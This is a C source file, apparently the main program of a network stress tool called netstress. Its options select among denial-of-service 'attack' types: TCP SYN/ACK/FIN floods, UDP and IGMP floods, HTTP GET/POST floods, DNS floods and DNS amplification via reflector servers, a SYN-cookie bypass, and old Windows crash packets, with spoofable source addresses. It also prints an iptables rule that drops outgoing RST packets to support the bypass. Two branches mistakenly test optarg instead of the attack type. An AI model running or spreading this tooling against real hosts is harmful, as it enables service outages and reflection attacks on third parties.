/*
 * Metin KAYA <kayameti@gmail.com>
 * 2010.07.13, Istanbul
 *
 * http://www.EnderUNIX.org/metin
 */

#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <netinet/in.h>

#include <sys/socket.h>
#include <sys/wait.h>

#include "compat.h"
#include "flood.h"
#include "netstress.h"
#include "mkstring.h"
#include "utils.h"


int						max_port			= 65532;
int						min_port			= 1;
int						numproc				= 0;
int						glob_pack_sz		= 0;
int						glob_udp_buf_sz		= 0;
int						starttime			= 0;
int						outcount			= 0;
int						glob_dns_query_type = 0;
int						glob_sock			= 0;
int						dns_servers_loaded	= 0;
unsigned int			glob_dot_cnt		= 0;
char 					dns_packet[1024]	= { '\0' };
char					user_agent[128]		= { '\0' };
char					attack_type[16]		= { '\0' };
char					glob_src_ip[16]		= { '\0' };
unsigned long			*dns_srv_ip			= NULL;
struct country_subnet	**glob_country_subnet_list;
struct sockaddr_in		glob_dst;
struct sockaddr_in		glob_src;
struct udp_pseudo		pseudohead;
struct help_checksum	udp_chk_construct;
struct udp_packet		udp_packet;
struct tcp_packet		tcp_packet;
struct arc4_ctx			ctx;


static char				qname[256]	= { '\0' };
static struct option	long_opts[]	= {
	{ "saddr",      1, 0, 's' },
	{ "sport",      1, 0, 'p' },
	{ "daddr",      1, 0, 'd' },
	{ "dport",      1, 0, 'P' },
	{ "file",       1, 0, 'f' },
	{ "attack",     1, 0, 'a' },
	{ "process",    1, 0, 'n' },
	{ "dnsqtype",   1, 0, 't' },
	{ "dnsqname",   1, 0, 'N' },
	{ "useragent",  1, 0, 'u' },
	{ "buffer",     1, 0, 'b' },
	{ "portmargin", 1, 0, 'm' },
	{ "help",       0, 0, 'h' },
	{ 0, 0, 0, 0             }
};


static void
parse_set_args(int argc, char **argv)
{
	int opt, opt_idx = 0;
#ifdef PATTERN_SRC_IP
	int i;
#endif
#ifdef RANDOM_DST_PORT
	char *p;
	char buf[32] = { '\0' };
#endif

	if (argc == 1)
		USAGE(NULL);

	memset(&ctx,				0x0, sizeof(ctx));
	memset(&glob_src,			0x0, sizeof(glob_src));
	memset(&glob_dst,			0x0, sizeof(glob_dst));
	memset(&tcp_packet,			0x0, sizeof(tcp_packet));
	memset(&udp_packet,			0x0, sizeof(udp_packet));
	memset(&pseudohead,			0x0, sizeof(pseudohead));
	memset(&udp_chk_construct,	0x0, sizeof(udp_chk_construct));

	while ((opt = getopt_long(argc, argv, "s:p:d:P:f:a:n:t:N:u:b:m:h",
			long_opts, &opt_idx)) != -1) {
		switch (opt) {
		case 's':
#ifdef STATIC_SRC_IP
			resolve(optarg, (in_addr_t *) &glob_src.sin_addr.s_addr);
			udp_packet.ip.SADDR = glob_src.sin_addr.s_addr;
			udp_packet.ip.IPSUM = in_cksum((u_short *) &udp_packet.ip, IPHDRSIZ);
			tcp_packet.src = glob_src.sin_addr.s_addr;
#elif defined(PATTERN_SRC_IP)
			strncpy(glob_src_ip, optarg, sizeof(glob_src_ip) - 1);
			for (i = 0; glob_src_ip[i] != '\0'; i++)
				if (glob_src_ip[i] == '.')
					glob_dot_cnt++;
			glob_dot_cnt = 4 - glob_dot_cnt;
#endif
			glob_src.sin_family = AF_INET;
			break;
		case 'p':
			get_port(optarg, &glob_src.sin_port);
#ifndef RANDOM_SRC_PORT
			tcp_packet.sport		= glob_src.sin_port;
			udp_packet.udp.UHSPORT	= glob_src.sin_port;
#endif
			break;
		case 'd':
			resolve(optarg, (in_addr_t *) &glob_dst.sin_addr.s_addr);
			glob_dst.sin_family = AF_INET;
			break;
		case 'P':
			get_port(optarg, &glob_dst.sin_port);
			break;
		case 'f':
			load_dns_servers(optarg);
			break;
		case 'b':
			glob_udp_buf_sz = atoi(optarg);
			break;
		case 'a':
			if (!strcasecmp(optarg, "PUSH")    ||
				!strcasecmp(optarg, "ACK")     ||
				!strcasecmp(optarg, "SYN")     ||
				!strcasecmp(optarg, "FIN")     ||
				!strcasecmp(optarg, "UDP")     ||
				!strcasecmp(optarg, "IGMP")    ||
				!strcasecmp(optarg, "WIN98")   ||
				!strcasecmp(optarg, "WINBOMB") ||
				!strcasecmp(optarg, "GET")     ||
				!strcasecmp(optarg, "POST")    ||
				!strcasecmp(optarg, "DNS")     ||
				!strcasecmp(optarg, "SYNCOOK") ||
				!strcasecmp(optarg, "ISSSYN")  ||
				!strcasecmp(optarg, "AMPDNS"))
				strncpy(attack_type, optarg, sizeof(attack_type) - 1);
			else
				USAGE("none of PUSH, ACK, SYN, FIN, DNS, UDP,"
					  " AMPDNS, ICMP, SYNCOOK, ISSSYN, GET, and "
					  "POST matched. wrong attack type!");
			break;
		case 'n':
			numproc = atoi(optarg);
			break;
		case 't':
			set_dns_query_type(&glob_dns_query_type, optarg);
			break;
		case 'u':
			strncpy(user_agent, optarg, sizeof(user_agent) - 1);
			break;
		case 'N':
			strncpy(qname, optarg, sizeof(qname) - 1);
			break;
		case 'm':
#ifdef RANDOM_DST_PORT
			strncpy(buf, optarg, sizeof(buf) - 1);
			p = strtok(buf, ":");
			if (!p)
				NS_ERR("port range can be specified like that: \"min_port:max_port\", e.g: 0:1024\n");
			min_port = atoi(p);
			p = strtok(NULL, ":");
			if (!p)
				NS_ERR("port range can be specified like that: \"min_port:max_port\", e.g: 0:1024\n");
			max_port = atoi(p);
#else
			NS_ERR("why did NOT you enabled random destination port support?\n");
#endif
			break;
		case 'h':
			USAGE(NULL);
			break;
		default:
			USAGE("wrong parameters!");
		}
	}
}


int
main(int argc, char **argv)
{
	int x;

	if (getuid())
		NS_ERR("you should be the omnipotent root!");

	parse_set_args(argc, argv);
	if (attack_type[0] == '\0')
		NS_ERR("Attack type must be defined with \"-a\" parameter!");
	if (!numproc && strcasecmp(attack_type, "SYNCOOK") != 0)
		NS_ERR("Number of process must be defined with \"-n\" "
			"parameter and different from 0!");

	signal(SIGHUP,	&sig_handler);
	signal(SIGINT,	&sig_handler);
	signal(SIGSEGV,	&sig_handler);
	signal(SIGTERM,	&sig_handler);

#ifdef STATIC_SRC_IP
	if (!glob_src.sin_addr.s_addr) {
		get_local_addr();
		udp_packet.ip.SADDR = glob_src.sin_addr.s_addr;
		udp_packet.ip.IPSUM = in_cksum((u_short *) &udp_packet.ip,
					IPHDRSIZ);
		tcp_packet.src = glob_src.sin_addr.s_addr;
	}
#endif

	if (!strcasecmp(attack_type,        "GET")) {
		if (user_agent[0] == '\0') {
			strcpy(user_agent, "Mozilla Firefox");
			printf("\e[35muser agent can be specified with \"-u\" parameter. fyi.\e[0m\n");
		}
		if (!glob_dst.sin_port) {
			glob_dst.sin_port = htons(80);
			printf("\e[35mdestination port can be specified with \"-P\" parameter. fyi.\e[0m\n");
		}
		glob_pack_sz = 256;
		http_get_flood();
	} else if (!strcasecmp(attack_type, "POST")) {
		glob_pack_sz = 256;
		http_post_flood();
	} else if (!strcasecmp(attack_type, "SYNCOOK")) {
		printf("\n\e[32mplease run \"iptables -A OUTPUT -p tcp -m tcp "
			"--tcp-flags RST RST -j DROP\"\ncommand before "
			"by-passing syn cookie...\n\e[0m");
		glob_pack_sz = sizeof(tcp_packet) + 14;
		bypass_synproxy();
	} else if (!strcasecmp(attack_type, "PUSH")   ||
			   !strcasecmp(attack_type, "ACK")    ||
			   !strcasecmp(attack_type, "SYN")    ||
			   !strcasecmp(attack_type, "ISSSYN") ||
			   !strcasecmp(attack_type, "FIN")) {
		prep_tcp(&tcp_packet, attack_type, glob_dst.sin_addr.s_addr,
			glob_dst.sin_port);
		glob_pack_sz = sizeof(tcp_packet);
		tcp_flood();
	} else if (!strcasecmp(attack_type, "DNS")) {
		if (!glob_dns_query_type)
			NS_ERR("DNS query type must be defined with \"-t\" "
				"parameter!");
		glob_pack_sz = 64;
		dns_flood();
	} else if (!strcasecmp(attack_type, "AMPDNS")) {
		if (qname[0] == '\0')
			NS_ERR("Hostname which will be queried must be defined"
				" with \"-N\" parameter!");
		if (!dns_servers_loaded)
			NS_ERR("The file that includes DNS server addresses "
				"must be provided with \"-f\" parameter!");
		glob_pack_sz = 64;
		amp_dns_flood(qname);
	} else if (!strcasecmp(attack_type, "UDP")) {
		prep_udp(&udp_packet, glob_dst.sin_addr.s_addr,
			glob_dst.sin_port);
		glob_pack_sz = sizeof(udp_packet) + glob_udp_buf_sz;
		udp_flood();
	} else if (!strcasecmp(attack_type, "IGMP")) {
		glob_pack_sz = 40;
		igmp_flood();
	} else if (!strcasecmp(optarg, "WIN98")) {
		glob_pack_sz = 1500;
		win98bug_flood();
	} else if (!strcasecmp(optarg, "WINBOMB")) {
		glob_pack_sz = 40;
		winbomb_flood();
	} else {
		NS_ERR("Attack type must be defined with \"-a\" parameter!");
	}

	wait(&x);

	exit(0);
}
